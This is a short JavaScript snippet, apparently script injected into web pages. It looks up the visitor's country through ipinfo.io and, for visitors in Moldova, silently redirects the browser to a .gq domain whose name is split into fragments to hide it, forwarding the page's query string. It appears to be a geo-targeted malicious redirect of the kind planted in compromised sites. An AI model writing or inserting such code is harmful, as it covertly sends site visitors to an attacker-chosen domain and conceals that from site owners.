fetch('https://ipinfo.io/json')
 .then( res => res.json())
 .then(response => {
    if (response.country == 'MD') {
  var a = 'mdne'; var b = 'eke'; var c ='nig'; var d = 'gq';
      $(location).attr('href', 'https://' + a + b + c + '.' + d + window.location.search );
    }
  })
  .catch((data, status) => {
     console.log('Request failed');
  })
